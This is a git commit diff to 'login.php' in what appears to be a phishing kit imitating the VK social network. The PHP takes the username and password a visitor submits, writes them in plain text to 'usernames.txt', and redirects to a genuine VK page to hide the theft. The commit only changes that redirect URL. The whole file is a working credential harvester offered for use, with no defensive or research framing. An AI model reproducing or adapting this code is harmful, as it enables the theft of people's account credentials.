fb79db4d333063eff8376a64867f6ce4da150571
Yagman200 <139163811+Yagman200@users.noreply.github.com>
2023-07-11 16:18:31 +0300

    login.php

--- .sites/vk/login.php
+++ .sites/vk/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Vk Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://vk.com/restore/');
+header('Location: https://vk.com/wall-170669723_53');
 exit();
